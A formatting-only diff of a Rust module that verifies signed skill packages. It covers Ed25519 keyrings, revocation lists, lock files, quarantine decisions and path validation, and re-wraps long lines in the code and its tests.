@@ -216,7 +216,9 @@ pub struct PendingOwnerAttestation {
 pub enum SkillPackageProof {
     RemoteSignature(SkillSignature),
     /// The digest of a compiled-in/source-tree manifest known to the verifier.
-    EmbeddedManifest { manifest_digest: String },
+    EmbeddedManifest {
+        manifest_digest: String,
+    },
     LocalOwnerAttestation(LocalOwnerAttestation),
     PendingOwnerAttestation(PendingOwnerAttestation),
 }
@@ -397,7 +399,10 @@ struct CanonicalIdentity<'a> {
 #[derive(Serialize)]
 #[serde(rename_all = "snake_case", tag = "kind")]
 enum CanonicalProof<'a> {
-    RemoteSignature { algorithm: &'a str, key_id: &'a str },
+    RemoteSignature {
+        algorithm: &'a str,
+        key_id: &'a str,
+    },
     EmbeddedManifest {
         manifest_digest: &'a str,
     },
@@ -433,7 +438,11 @@ pub struct TrustedSkillKey {
 
 impl TrustedSkillKey {
     #[must_use]
-    pub fn from_ed25519_bytes(key_id: impl Into<String>, public_key: [u8; 32], active_signer: bool) -> Self {
+    pub fn from_ed25519_bytes(
+        key_id: impl Into<String>,
+        public_key: [u8; 32],
+        active_signer: bool,
+    ) -> Self {
         Self {
             key_id: key_id.into(),
             public_key: base64::engine::general_purpose::STANDARD.encode(public_key),
@@ -970,7 +979,6 @@ impl SkillTrustKeyring {
 pub struct SkillSigningKey(SigningKey);
 
 impl SkillSigningKey {
-
     #[must_use]
     pub fn public_key_bytes(&self) -> [u8; 32] {
         self.0.verifying_key().to_bytes()
@@ -998,7 +1006,11 @@ impl SkillSigningKey {
 
     #[must_use]
     pub fn trusted_key(&self, key_id: impl Into<String>, active_signer: bool) -> TrustedSkillKey {
-        TrustedSkillKey::from_ed25519_bytes(key_id, self.0.verifying_key().to_bytes(), active_signer)
+        TrustedSkillKey::from_ed25519_bytes(
+            key_id,
+            self.0.verifying_key().to_bytes(),
+            active_signer,
+        )
     }
 
     #[must_use]
@@ -1136,11 +1148,12 @@ impl LocalOwnerSigningKey {
         })?;
         let bytes = base64::engine::general_purpose::STANDARD
             .decode(encoded.trim().as_bytes())
-            .map_err(|_| SkillTrustError::Malformed("invalid owner private key encoding".to_string()))?;
-        let seed: [u8; 32] = bytes
-            .as_slice()
-            .try_into()
-            .map_err(|_| SkillTrustError::Malformed("owner private key must be 32 bytes".to_string()))?;
+            .map_err(|_| {
+                SkillTrustError::Malformed("invalid owner private key encoding".to_string())
+            })?;
+        let seed: [u8; 32] = bytes.as_slice().try_into().map_err(|_| {
+            SkillTrustError::Malformed("owner private key must be 32 bytes".to_string())
+        })?;
         Ok(Self::from_seed(seed))
     }
 
@@ -1290,11 +1303,16 @@ impl SkillRevocation {
         ];
         let identity_match = checks.iter().flatten().all(|matches| *matches)
             && checks.iter().any(|check| check.is_some());
-        let key_match = self.key_id.as_ref().is_some_and(|key_id| match &manifest.proof {
-            SkillPackageProof::RemoteSignature(signature) => signature.key_id == *key_id,
-            SkillPackageProof::LocalOwnerAttestation(attestation) => attestation.key_id == *key_id,
-            _ => false,
-        });
+        let key_match = self
+            .key_id
+            .as_ref()
+            .is_some_and(|key_id| match &manifest.proof {
+                SkillPackageProof::RemoteSignature(signature) => signature.key_id == *key_id,
+                SkillPackageProof::LocalOwnerAttestation(attestation) => {
+                    attestation.key_id == *key_id
+                }
+                _ => false,
+            });
         identity_match || key_match
     }
 }
@@ -1571,7 +1589,6 @@ impl SkillTrustVerifier {
         self
     }
 
-
     /// Recompute and verify all evidence for one physical package directory.
     pub fn verify_bundle(
         &self,
@@ -1657,7 +1674,10 @@ pub fn normalize_relative_package_path(path: &Path) -> Result<String, SkillTrust
                 }
                 normalized.push(value);
             }
-            Component::CurDir | Component::ParentDir | Component::RootDir | Component::Prefix(_) => {
+            Component::CurDir
+            | Component::ParentDir
+            | Component::RootDir
+            | Component::Prefix(_) => {
                 return Err(SkillTrustError::Malformed(
                     "package path contains traversal or root component".to_string(),
                 ))
@@ -1709,7 +1729,8 @@ pub fn load_lock_for_migration(skills_root: &Path) -> Result<SkillLockLoad, Skil
 /// Owner-only atomic+fsync lock write.
 pub fn store_lock(skills_root: &Path, lock: &SkillLockV2) -> Result<(), SkillTrustError> {
     validate_lock(lock)?;
-    let raw = serde_json::to_vec_pretty(lock).map_err(|error| SkillTrustError::Serialization(error.to_string()))?;
+    let raw = serde_json::to_vec_pretty(lock)
+        .map_err(|error| SkillTrustError::Serialization(error.to_string()))?;
     atomic_private_write(&skill_lock_path(skills_root), &raw)
 }
 
@@ -1823,7 +1844,10 @@ fn closed_scan_verdict(findings: &[SkillScanFinding]) -> SkillScanVerdictV2 {
     }) {
         return SkillScanVerdictV2::Invalid;
     }
-    if findings.iter().any(|finding| finding.severity == "critical") {
+    if findings
+        .iter()
+        .any(|finding| finding.severity == "critical")
+    {
         SkillScanVerdictV2::Dangerous
     } else if findings.is_empty() {
         SkillScanVerdictV2::Clean
@@ -1856,9 +1880,9 @@ fn canonical_bundle_files(root: &Path) -> Result<Vec<(String, PathBuf)>, SkillTr
         entries.sort_by(|left, right| left.file_name().cmp(&right.file_name()));
         for entry in entries {
             let path = entry.path();
-            let relative = path.strip_prefix(root).map_err(|_| {
-                SkillTrustError::Malformed("package path escaped root".to_string())
-            })?;
+            let relative = path
+                .strip_prefix(root)
+                .map_err(|_| SkillTrustError::Malformed("package path escaped root".to_string()))?;
             if is_detached_trust_metadata(relative) {
                 continue;
             }
@@ -1887,13 +1911,15 @@ fn canonical_bundle_files(root: &Path) -> Result<Vec<(String, PathBuf)>, SkillTr
 fn decode_public_key(encoded: &str) -> Result<VerifyingKey, SkillTrustError> {
     let bytes = base64::engine::general_purpose::STANDARD
         .decode(encoded.as_bytes())
-        .map_err(|error| SkillTrustError::MalformedKeyring(format!("invalid base64 public key: {error}")))?;
-    let bytes: [u8; 32] = bytes
-        .as_slice()
-        .try_into()
-        .map_err(|_| SkillTrustError::MalformedKeyring("Ed25519 public key must be 32 bytes".to_string()))?;
-    VerifyingKey::from_bytes(&bytes)
-        .map_err(|error| SkillTrustError::MalformedKeyring(format!("invalid Ed25519 public key: {error}")))
+        .map_err(|error| {
+            SkillTrustError::MalformedKeyring(format!("invalid base64 public key: {error}"))
+        })?;
+    let bytes: [u8; 32] = bytes.as_slice().try_into().map_err(|_| {
+        SkillTrustError::MalformedKeyring("Ed25519 public key must be 32 bytes".to_string())
+    })?;
+    VerifyingKey::from_bytes(&bytes).map_err(|error| {
+        SkillTrustError::MalformedKeyring(format!("invalid Ed25519 public key: {error}"))
+    })
 }
 
 fn decode_signature(encoded: &str) -> Result<Signature, String> {
@@ -2031,9 +2057,7 @@ fn validate_manifest_shape(manifest: &SkillPackageManifestV2) -> Result<(), Skil
             "package identity has empty required fields".to_string(),
         ));
     }
-    if !is_sha256_digest(&identity.content_digest)
-        || !is_sha256_digest(&identity.manifest_digest)
-    {
+    if !is_sha256_digest(&identity.content_digest) || !is_sha256_digest(&identity.manifest_digest) {
         return Err(SkillTrustError::Malformed(
             "package content and manifest digests must be canonical SHA-256 values".to_string(),
         ));
@@ -2055,7 +2079,12 @@ fn validate_manifest_shape(manifest: &SkillPackageManifestV2) -> Result<(), Skil
         }
         _ => {}
     }
-    if manifest.dependencies != canonical_dependencies(&manifest.dependencies).into_iter().cloned().collect::<Vec<_>>() {
+    if manifest.dependencies
+        != canonical_dependencies(&manifest.dependencies)
+            .into_iter()
+            .cloned()
+            .collect::<Vec<_>>()
+    {
         return Err(SkillTrustError::Malformed(
             "package dependencies must be sorted and unique".to_string(),
         ));
@@ -2064,13 +2093,20 @@ fn validate_manifest_shape(manifest: &SkillPackageManifestV2) -> Result<(), Skil
 }
 
 fn atomic_private_write(path: &Path, bytes: &[u8]) -> Result<(), SkillTrustError> {
-    let parent = path.parent().ok_or_else(|| SkillTrustError::Malformed("trust path lacks parent".to_string()))?;
+    let parent = path
+        .parent()
+        .ok_or_else(|| SkillTrustError::Malformed("trust path lacks parent".to_string()))?;
     fs::create_dir_all(parent)?;
     ensure_private_directory(parent)?;
-    let file_name = path.file_name().and_then(|name| name.to_str()).ok_or_else(|| {
-        SkillTrustError::Malformed("non-UTF-8 trust file name".to_string())
-    })?;
-    let temporary = parent.join(format!(".{file_name}.tmp-{}-{}", std::process::id(), unique_nonce()));
+    let file_name = path
+        .file_name()
+        .and_then(|name| name.to_str())
+        .ok_or_else(|| SkillTrustError::Malformed("non-UTF-8 trust file name".to_string()))?;
+    let temporary = parent.join(format!(
+        ".{file_name}.tmp-{}-{}",
+        std::process::id(),
+        unique_nonce()
+    ));
     let result = (|| -> Result<(), SkillTrustError> {
         let mut file = OpenOptions::new()
             .write(true)
@@ -2144,7 +2180,12 @@ impl SkillTrustVerifier {
                     }
                     _ => SkillQuarantineReason::InvalidTrustRoot,
                 };
-                return Ok(quarantined(manifest, actual_scan, reason, error.to_string()));
+                return Ok(quarantined(
+                    manifest,
+                    actual_scan,
+                    reason,
+                    error.to_string(),
+                ));
             }
         };
         if let Err(error) = validate_manifest_shape(manifest) {
@@ -2204,13 +2245,22 @@ impl SkillTrustVerifier {
         if let Err((reason, detail)) = self.verify_revocation_list(&trusted_keys, revocations) {
             return Ok(quarantined(manifest, actual_scan, reason, detail));
         }
-        if let Some(revocation) = revocations.revoked.iter().find(|entry| entry.matches(manifest)) {
+        if let Some(revocation) = revocations
+            .revoked
+            .iter()
+            .find(|entry| entry.matches(manifest))
+        {
             let reason = if revocation.key_id.is_some() {
                 SkillQuarantineReason::RevokedKey
             } else {
                 SkillQuarantineReason::RevokedPackage
             };
-            return Ok(quarantined(manifest, actual_scan, reason, revocation.reason.clone()));
+            return Ok(quarantined(
+                manifest,
+                actual_scan,
+                reason,
+                revocation.reason.clone(),
+            ));
         }
         if let Some((reason, detail)) = self.verify_source_proof(&trusted_keys, manifest) {
             return Ok(quarantined(manifest, actual_scan, reason, detail));
@@ -2337,7 +2387,12 @@ impl SkillTrustVerifier {
                 ));
                 continue;
             }
-            admissions.push(self.verify_bundle(&package_root, &entry.manifest, revocations, force)?);
+            admissions.push(self.verify_bundle(
+                &package_root,
+                &entry.manifest,
+                revocations,
+                force,
+            )?);
         }
         Ok(admissions)
     }
@@ -2384,12 +2439,8 @@ impl SkillTrustVerifier {
                 "revocation list signature key is not trusted".to_string(),
             ));
         };
-        let signature_bytes = decode_signature(&signature.signature).map_err(|detail| {
-            (
-                SkillQuarantineReason::InvalidRevocationList,
-                detail,
-            )
-        })?;
+        let signature_bytes = decode_signature(&signature.signature)
+            .map_err(|detail| (SkillQuarantineReason::InvalidRevocationList, detail))?;
         let payload = revocations.canonical_payload().map_err(|error| {
             (
                 SkillQuarantineReason::InvalidRevocationList,
@@ -2561,13 +2612,12 @@ impl SkillTrustVerifier {
                 }
                 None
             }
-            (
-                SkillPackageSource::LocalAuthored,
-                SkillPackageProof::PendingOwnerAttestation(_),
-            ) => Some((
-                SkillQuarantineReason::PendingOwnerAttestation,
-                "local package is staged pending an explicit owner attestation".to_string(),
-            )),
+            (SkillPackageSource::LocalAuthored, SkillPackageProof::PendingOwnerAttestation(_)) => {
+                Some((
+                    SkillQuarantineReason::PendingOwnerAttestation,
+                    "local package is staged pending an explicit owner attestation".to_string(),
+                ))
+            }
             (SkillPackageSource::LocalAuthored, _) => Some((
                 SkillQuarantineReason::InvalidLocalAttestation,
                 "local package requires an explicit owner attestation".to_string(),
@@ -2621,10 +2671,7 @@ impl SkillTrustStore {
     }
 
     #[must_use]
-    pub fn with_shared_verifier(
-        skills_root: PathBuf,
-        verifier: Arc<SkillTrustVerifier>,
-    ) -> Self {
+    pub fn with_shared_verifier(skills_root: PathBuf, verifier: Arc<SkillTrustVerifier>) -> Self {
         Self {
             skills_root,
             verifier,
@@ -2683,27 +2730,30 @@ impl SkillTrustStore {
                 })
             }
         };
-        let admissions = match self
-            .verifier
-            .verify_lock(&self.skills_root, &lock, &revocations, force)
-        {
-            Ok(admissions) => admissions,
-            Err(error) => {
-                return Ok(SkillTrustLoad::Quarantined {
-                    name: name.to_string(),
-                    quarantine: SkillQuarantine {
-                        reason: SkillQuarantineReason::MalformedLock,
-                        detail: error.to_string(),
-                    },
-                })
-            }
-        };
+        let admissions =
+            match self
+                .verifier
+                .verify_lock(&self.skills_root, &lock, &revocations, force)
+            {
+                Ok(admissions) => admissions,
+                Err(error) => {
+                    return Ok(SkillTrustLoad::Quarantined {
+                        name: name.to_string(),
+                        quarantine: SkillQuarantine {
+                            reason: SkillQuarantineReason::MalformedLock,
+                            detail: error.to_string(),
+                        },
+                    })
+                }
+            };
         let entry = lock.packages[index].clone();
         let admission = admissions[index].clone();
         if !admission.is_allowed() {
             return Ok(SkillTrustLoad::Quarantined {
                 name: entry.manifest.identity.name,
-                quarantine: admission.quarantine.expect("quarantined admission has evidence"),
+                quarantine: admission
+                    .quarantine
+                    .expect("quarantined admission has evidence"),
             });
         }
         let root = package_root(&self.skills_root, &entry.install_path)?;
@@ -2761,8 +2811,7 @@ impl SkillTrustStore {
                 })
             }
         };
-        if relative_path == SKILL_HUB_DIR
-            || relative_path.starts_with(&format!("{SKILL_HUB_DIR}/"))
+        if relative_path == SKILL_HUB_DIR || relative_path.starts_with(&format!("{SKILL_HUB_DIR}/"))
         {
             return Ok(SkillTrustRead::Quarantined {
                 name: name.to_string(),
@@ -2788,12 +2837,16 @@ impl SkillTrustStore {
                 if !admission.is_allowed() {
                     return Ok(SkillTrustRead::Quarantined {
                         name: package.entry.manifest.identity.name,
-                        quarantine: admission.quarantine.expect("quarantined admission has evidence"),
+                        quarantine: admission
+                            .quarantine
+                            .expect("quarantined admission has evidence"),
                     });
                 }
                 let path = package.root.join(relative_path);
                 let _metadata = match fs::symlink_metadata(&path) {
-                    Ok(metadata) if metadata.is_file() && !metadata.file_type().is_symlink() => metadata,
+                    Ok(metadata) if metadata.is_file() && !metadata.file_type().is_symlink() => {
+                        metadata
+                    }
                     Ok(_) => {
                         return Ok(SkillTrustRead::Quarantined {
                             name: package.entry.manifest.identity.name,
@@ -2818,7 +2871,8 @@ impl SkillTrustStore {
                     force,
                 )?;
                 if !post_admission.is_allowed()
-                    || post_admission.identity.stable_key() != package.admission.identity.stable_key()
+                    || post_admission.identity.stable_key()
+                        != package.admission.identity.stable_key()
                     || post_admission.scan != package.admission.scan
                 {
                     return Ok(SkillTrustRead::Quarantined {
@@ -2839,8 +2893,9 @@ impl SkillTrustStore {
 /// Decode a detached transport manifest. The transport object is deliberately
 /// outside the package payload directory so content hashing cannot be circular.
 pub fn parse_package_manifest(bytes: &[u8]) -> Result<SkillPackageManifestV2, SkillTrustError> {
-    let manifest = serde_json::from_slice::<SkillPackageManifestV2>(bytes)
-        .map_err(|error| SkillTrustError::Malformed(format!("invalid package manifest: {error}")))?;
+    let manifest = serde_json::from_slice::<SkillPackageManifestV2>(bytes).map_err(|error| {
+        SkillTrustError::Malformed(format!("invalid package manifest: {error}"))
+    })?;
     validate_manifest_shape(&manifest)?;
     Ok(manifest)
 }
@@ -2852,8 +2907,10 @@ pub fn load_keyring(skills_root: &Path) -> Result<SkillTrustKeyring, SkillTrustE
     }
     reject_private_trust_parent(&path)?;
     reject_private_file(&path)?;
-    let keyring = serde_json::from_slice::<SkillTrustKeyring>(&fs::read(path)?)
-        .map_err(|error| SkillTrustError::MalformedKeyring(format!("invalid stored keyring: {error}")))?;
+    let keyring =
+        serde_json::from_slice::<SkillTrustKeyring>(&fs::read(path)?).map_err(|error| {
+            SkillTrustError::MalformedKeyring(format!("invalid stored keyring: {error}"))
+        })?;
     keyring.validate()?;
     Ok(keyring)
 }
@@ -2874,9 +2931,10 @@ pub fn load_remote_trust_root_file(
         Ok(_) => {}
     }
     validate_external_authority_file(skills_root, root_file, "remote trust root")?;
-    let root = serde_json::from_slice::<SkillRemoteTrustRoot>(&fs::read(root_file)?).map_err(
-        |error| SkillTrustError::InvalidTrustRoot(format!("invalid remote trust root: {error}")),
-    )?;
+    let root =
+        serde_json::from_slice::<SkillRemoteTrustRoot>(&fs::read(root_file)?).map_err(|error| {
+            SkillTrustError::InvalidTrustRoot(format!("invalid remote trust root: {error}"))
+        })?;
     root.validate()?;
     Ok(root)
 }
@@ -2975,9 +3033,10 @@ pub fn load_signed_remote_keyring(
     }
     reject_private_trust_parent(&path)?;
     reject_private_file(&path)?;
-    let keyring = serde_json::from_slice::<SignedRemoteSkillKeyring>(&fs::read(&path)?).map_err(
-        |error| SkillTrustError::InvalidTrustRoot(format!("invalid signed remote keyring: {error}")),
-    )?;
+    let keyring =
+        serde_json::from_slice::<SignedRemoteSkillKeyring>(&fs::read(&path)?).map_err(|error| {
+            SkillTrustError::InvalidTrustRoot(format!("invalid signed remote keyring: {error}"))
+        })?;
     keyring.validate_shape()?;
     let Some(signature) = keyring.signature.as_ref() else {
         return Err(SkillTrustError::InvalidTrustRoot(
@@ -3034,12 +3093,8 @@ pub fn install_signed_remote_keyring_from_file(
     let (active_root_key_id, _) = verify_signed_remote_keyring(&root, &keyring)?;
     let digest = signed_remote_keyring_digest(&keyring)?;
     let mut audit = load_remote_keyring_audit_file(skills_root, &remote_trust.audit_file)?;
-    let audit_changed = apply_remote_keyring_audit(
-        &mut audit,
-        keyring.epoch,
-        &digest,
-        &active_root_key_id,
-    )?;
+    let audit_changed =
+        apply_remote_keyring_audit(&mut audit, keyring.epoch, &digest, &active_root_key_id)?;
 
     let keyring_path = skill_keyring_path(skills_root);
     let old_keyring = match fs::read(&keyring_path) {
@@ -3056,7 +3111,8 @@ pub fn install_signed_remote_keyring_from_file(
     if !audit_changed {
         return Ok(());
     }
-    if let Err(error) = store_remote_keyring_audit_file(skills_root, &remote_trust.audit_file, &audit)
+    if let Err(error) =
+        store_remote_keyring_audit_file(skills_root, &remote_trust.audit_file, &audit)
     {
         let rollback_keyring = match old_keyring {
             Some(previous) => atomic_private_write(&keyring_path, &previous),
@@ -3092,14 +3148,14 @@ pub fn load_remote_keyring_audit_file(
             reject_private_file(audit_file)?;
             let audit = serde_json::from_slice::<SkillRemoteKeyringAudit>(&fs::read(audit_file)?)
                 .map_err(|error| {
-                    SkillTrustError::InvalidTrustRoot(format!(
-                        "invalid remote keyring audit: {error}"
-                    ))
-                })?;
+                SkillTrustError::InvalidTrustRoot(format!("invalid remote keyring audit: {error}"))
+            })?;
             audit.validate()?;
             Ok(audit)
         }
-        Err(error) if error.kind() == io::ErrorKind::NotFound => Ok(SkillRemoteKeyringAudit::default()),
+        Err(error) if error.kind() == io::ErrorKind::NotFound => {
+            Ok(SkillRemoteKeyringAudit::default())
+        }
         Err(error) => Err(error.into()),
     }
 }
@@ -3125,12 +3181,7 @@ fn load_anchored_remote_keys(
     let (active_root_key_id, keys) = verify_signed_remote_keyring(&root, &keyring)?;
     let digest = signed_remote_keyring_digest(&keyring)?;
     let mut audit = load_remote_keyring_audit_file(skills_root, &config.audit_file)?;
-    if apply_remote_keyring_audit(
-        &mut audit,
-        keyring.epoch,
-        &digest,
-        &active_root_key_id,
-    )? {
+    if apply_remote_keyring_audit(&mut audit, keyring.epoch, &digest, &active_root_key_id)? {
         store_remote_keyring_audit_file(skills_root, &config.audit_file, &audit)?;
     }
     Ok(keys)
@@ -3143,12 +3194,10 @@ fn apply_remote_keyring_audit(
     root_key_id: &str,
 ) -> Result<bool, SkillTrustError> {
     match audit.accepted.last() {
-        Some(previous) if epoch < previous.epoch => Err(SkillTrustError::KeyringRollback(
-            format!(
-                "keyring epoch {epoch} is older than audited epoch {}",
-                previous.epoch
-            ),
-        )),
+        Some(previous) if epoch < previous.epoch => Err(SkillTrustError::KeyringRollback(format!(
+            "keyring epoch {epoch} is older than audited epoch {}",
+            previous.epoch
+        ))),
         Some(previous) if epoch == previous.epoch => {
             if previous.envelope_digest != envelope_digest || previous.root_key_id != root_key_id {
                 Err(SkillTrustError::KeyringRollback(
@@ -3214,12 +3263,15 @@ fn verify_signed_remote_keyring(
             "remote keyring signer is not the authorized root".to_string(),
         ));
     }
-    let signature = decode_signature(&signature.signature).map_err(SkillTrustError::InvalidTrustRoot)?;
-    root_key.verify(&keyring.canonical_payload()?, &signature).map_err(|_| {
-        SkillTrustError::InvalidTrustRoot(
-            "remote keyring root signature verification failed".to_string(),
-        )
-    })?;
+    let signature =
+        decode_signature(&signature.signature).map_err(SkillTrustError::InvalidTrustRoot)?;
+    root_key
+        .verify(&keyring.canonical_payload()?, &signature)
+        .map_err(|_| {
+            SkillTrustError::InvalidTrustRoot(
+                "remote keyring root signature verification failed".to_string(),
+            )
+        })?;
     let keys = keyring
         .publisher_keys
         .iter()
@@ -3277,16 +3329,14 @@ fn validate_external_authority_destination(
             "{label} path must be absolute"
         )));
     }
-    let parent = path.parent().ok_or_else(|| {
-        SkillTrustError::InvalidTrustRoot(format!("{label} path has no parent"))
-    })?;
+    let parent = path
+        .parent()
+        .ok_or_else(|| SkillTrustError::InvalidTrustRoot(format!("{label} path has no parent")))?;
     let canonical_root = fs::canonicalize(skills_root).map_err(|error| {
         SkillTrustError::InvalidTrustRoot(format!("cannot canonicalize skills root: {error}"))
     })?;
     let canonical_parent = fs::canonicalize(parent).map_err(|error| {
-        SkillTrustError::InvalidTrustRoot(format!(
-            "cannot canonicalize {label} parent: {error}"
-        ))
+        SkillTrustError::InvalidTrustRoot(format!("cannot canonicalize {label} parent: {error}"))
     })?;
     reject_private_directory(&canonical_parent, label)?;
     if canonical_parent.starts_with(&canonical_root) {
@@ -3302,9 +3352,7 @@ fn validate_external_authority_destination(
                 )));
             }
             let canonical = fs::canonicalize(path).map_err(|error| {
-                SkillTrustError::InvalidTrustRoot(format!(
-                    "cannot canonicalize {label}: {error}"
-                ))
+                SkillTrustError::InvalidTrustRoot(format!("cannot canonicalize {label}: {error}"))
             })?;
             if canonical.starts_with(&canonical_root) {
                 return Err(SkillTrustError::InvalidTrustRoot(format!(
@@ -3368,15 +3416,18 @@ pub fn load_local_owner_keyring_file(
         Ok(_) => {}
     }
     validate_external_authority_file(skills_root, keyring_file, "local owner keyring")?;
-    let keyring = serde_json::from_slice::<LocalOwnerKeyring>(&fs::read(keyring_file)?)
-        .map_err(|error| SkillTrustError::MalformedKeyring(format!(
-            "invalid local owner keyring: {error}"
-        )))?;
+    let keyring =
+        serde_json::from_slice::<LocalOwnerKeyring>(&fs::read(keyring_file)?).map_err(|error| {
+            SkillTrustError::MalformedKeyring(format!("invalid local owner keyring: {error}"))
+        })?;
     keyring.validate()?;
     Ok(keyring)
 }
 
-pub fn store_keyring(skills_root: &Path, keyring: &SkillTrustKeyring) -> Result<(), SkillTrustError> {
+pub fn store_keyring(
+    skills_root: &Path,
+    keyring: &SkillTrustKeyring,
+) -> Result<(), SkillTrustError> {
     keyring.validate()?;
     if !keyring.local_owner_keys.is_empty() {
         return Err(SkillTrustError::MalformedKeyring(
@@ -3457,9 +3508,11 @@ impl SkillTrustVerifier {
         policy: SkillTrustPolicy,
         embedded_manifest_digests: BTreeMap<String, String>,
     ) -> Result<Self, SkillTrustError> {
-        let local_owner_keys =
-            load_local_owner_keyring_file(authority.skills_root(), authority.local_owner_keyring_file())?
-                .keys;
+        let local_owner_keys = load_local_owner_keyring_file(
+            authority.skills_root(),
+            authority.local_owner_keyring_file(),
+        )?
+        .keys;
         Self::for_skill_root_with_remote_trust_config(
             authority.skills_root(),
             policy,
@@ -3522,7 +3575,9 @@ fn package_root(skills_root: &Path, install_path: &str) -> Result<PathBuf, Skill
 fn duplicate_identities(lock: &SkillLockV2) -> BTreeSet<String> {
     let mut counts = BTreeMap::<String, usize>::new();
     for entry in &lock.packages {
-        *counts.entry(entry.manifest.identity.stable_key()).or_default() += 1;
+        *counts
+            .entry(entry.manifest.identity.stable_key())
+            .or_default() += 1;
     }
     counts
         .into_iter()
@@ -3533,7 +3588,9 @@ fn duplicate_identities(lock: &SkillLockV2) -> BTreeSet<String> {
 fn duplicate_runtime_names(lock: &SkillLockV2) -> BTreeSet<String> {
     let mut counts = BTreeMap::<String, usize>::new();
     for entry in &lock.packages {
-        *counts.entry(entry.manifest.identity.name.clone()).or_default() += 1;
+        *counts
+            .entry(entry.manifest.identity.name.clone())
+            .or_default() += 1;
     }
     counts
         .into_iter()
@@ -3637,7 +3694,10 @@ fn compatibility_detail(
     if missing.is_empty() {
         Ok(())
     } else {
-        Err(format!("package requires unavailable feature(s): {}", missing.join(", ")))
+        Err(format!(
+            "package requires unavailable feature(s): {}",
+            missing.join(", ")
+        ))
     }
 }
 
@@ -3673,7 +3733,9 @@ fn is_immutable_revision(value: &str) -> bool {
         return false;
     }
     let hash = value.strip_prefix("git:").unwrap_or(value);
-    (hash.len() >= 7 && hash.len() <= 64 && hash.chars().all(|character| character.is_ascii_hexdigit()))
+    (hash.len() >= 7
+        && hash.len() <= 64
+        && hash.chars().all(|character| character.is_ascii_hexdigit()))
         || (value.starts_with("sha256:")
             && value.len() == "sha256:".len() + 64
             && value["sha256:".len()..]
@@ -3701,9 +3763,14 @@ fn load_lock_implementation(skills_root: &Path) -> Result<SkillLockLoad, SkillTr
     let value = serde_json::from_slice::<serde_json::Value>(&raw)
         .map_err(|error| SkillTrustError::Malformed(format!("invalid lock JSON: {error}")))?;
     let Some(object) = value.as_object() else {
-        return Err(SkillTrustError::Malformed("lock must be a JSON object".to_string()));
+        return Err(SkillTrustError::Malformed(
+            "lock must be a JSON object".to_string(),
+        ));
     };
-    match object.get("schema_version").and_then(serde_json::Value::as_u64) {
+    match object
+        .get("schema_version")
+        .and_then(serde_json::Value::as_u64)
+    {
         Some(version) if version == u64::from(SKILL_LOCK_SCHEMA_VERSION) => {
             let lock = serde_json::from_value::<SkillLockV2>(value)
                 .map_err(|error| SkillTrustError::Malformed(format!("invalid v2 lock: {error}")))?;
@@ -3724,7 +3791,11 @@ mod tests {
         fs::write(root.join("SKILL.md"), content).unwrap();
     }
 
-    fn remote_manifest(root: &Path, signer: &SkillSigningKey, key_id: &str) -> SkillPackageManifestV2 {
+    fn remote_manifest(
+        root: &Path,
+        signer: &SkillSigningKey,
+        key_id: &str,
+    ) -> SkillPackageManifestV2 {
         let digest = canonical_bundle_digest(root).unwrap();
         let identity = SkillPackageIdentityV2::new(
             "demo",
@@ -3889,9 +3960,15 @@ mod tests {
         fs::write(left.join("nested/a.txt"), "a").unwrap();
         fs::write(right.join("nested/a.txt"), "a").unwrap();
         fs::write(right.join("z.txt"), "z").unwrap();
-        assert_eq!(canonical_bundle_digest(&left).unwrap(), canonical_bundle_digest(&right).unwrap());
+        assert_eq!(
+            canonical_bundle_digest(&left).unwrap(),
+            canonical_bundle_digest(&right).unwrap()
+        );
         fs::write(right.join("z.txt"), "changed").unwrap();
-        assert_ne!(canonical_bundle_digest(&left).unwrap(), canonical_bundle_digest(&right).unwrap());
+        assert_ne!(
+            canonical_bundle_digest(&left).unwrap(),
+            canonical_bundle_digest(&right).unwrap()
+        );
     }
 
     #[test]
@@ -3905,9 +3982,7 @@ mod tests {
         let first = remote_manifest(&first_root, &signer, "publisher-key");
         let mut second = remote_manifest(&second_root, &signer, "publisher-key");
         second.identity.version = "2.0.0".to_string();
-        signer
-            .sign_manifest(&mut second, "publisher-key")
-            .unwrap();
+        signer.sign_manifest(&mut second, "publisher-key").unwrap();
         let lock = SkillLockV2 {
             schema_version: SKILL_LOCK_SCHEMA_VERSION,
             packages: vec![
@@ -3941,9 +4016,7 @@ mod tests {
         let first = remote_manifest(&first_root, &signer, "publisher-key");
         let mut second = remote_manifest(&second_root, &signer, "publisher-key");
         second.identity.version = "2.0.0".to_string();
-        signer
-            .sign_manifest(&mut second, "publisher-key")
-            .unwrap();
+        signer.sign_manifest(&mut second, "publisher-key").unwrap();
         let lock = SkillLockV2 {
             schema_version: SKILL_LOCK_SCHEMA_VERSION,
             packages: vec![
@@ -3994,12 +4067,10 @@ mod tests {
             manifest.identity.content_digest
         );
         assert_eq!(full_skill_scan(root), manifest.scan);
-        assert!(
-            verifier(vec![signer.trusted_key("k1", true)])
-                .verify_bundle(root, &manifest, &SignedSkillRevocationList::empty(), false)
-                .unwrap()
-                .is_allowed()
-        );
+        assert!(verifier(vec![signer.trusted_key("k1", true)])
+            .verify_bundle(root, &manifest, &SignedSkillRevocationList::empty(), false)
+            .unwrap()
+            .is_allowed());
     }
 
     #[test]
@@ -4015,7 +4086,10 @@ mod tests {
             canonical_bundle_digest(&root).unwrap(),
             manifest.identity.content_digest
         );
-        assert_eq!(full_skill_scan(&root).verdict, SkillScanVerdictV2::Dangerous);
+        assert_eq!(
+            full_skill_scan(&root).verdict,
+            SkillScanVerdictV2::Dangerous
+        );
         assert_eq!(
             quarantine_reason(
                 verifier(vec![signer.trusted_key("k1", true)])
@@ -4034,7 +4108,10 @@ mod tests {
         let old = SkillSigningKey::from_seed([7; 32]);
         let next = SkillSigningKey::from_seed([8; 32]);
         let manifest = remote_manifest(&root, &old, "old");
-        let rotated = verifier(vec![old.trusted_key("old", false), next.trusted_key("next", true)]);
+        let rotated = verifier(vec![
+            old.trusted_key("old", false),
+            next.trusted_key("next", true),
+        ]);
         assert!(rotated
             .verify_bundle(&root, &manifest, &SignedSkillRevocationList::empty(), false)
             .unwrap()
@@ -4111,7 +4188,11 @@ mod tests {
         };
         next.sign_revocations(&mut revocations, "next").unwrap();
         assert_eq!(
-            quarantine_reason(rotated.verify_bundle(&root, &manifest, &revocations, false).unwrap()),
+            quarantine_reason(
+                rotated
+                    .verify_bundle(&root, &manifest, &revocations, false)
+                    .unwrap()
+            ),
             SkillQuarantineReason::RevokedKey
         );
     }
@@ -4129,7 +4210,12 @@ mod tests {
         assert_eq!(
             quarantine_reason(
                 verifier
-                    .verify_bundle(&root, &incompatible, &SignedSkillRevocationList::empty(), false)
+                    .verify_bundle(
+                        &root,
+                        &incompatible,
+                        &SignedSkillRevocationList::empty(),
+                        false
+                    )
